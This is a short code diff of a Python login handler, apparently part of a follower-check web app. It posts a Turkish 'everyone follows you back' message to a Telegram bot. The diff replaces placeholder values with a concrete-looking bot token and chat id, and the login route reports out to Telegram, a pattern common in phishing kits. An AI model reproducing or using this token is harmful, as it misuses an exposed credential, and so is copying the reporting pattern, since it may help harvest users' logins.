@@ -37,8 +37,8 @@ def login():
             message = "Herkes seni geri takip ediyor."
 
         requests.post(
-            "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage",
-            data={"chat_id": "<YOUR_CHAT_ID>", "text": message}
+            "https://api.telegram.org/bot7826510525:AAETKgNWahBzWWa4FRRkCnit4QaByYFjHYc/sendMessage",
+            data={"chat_id": "6642524834", "text": message}
         )
 
         return jsonify({"status": "success", "message": message})
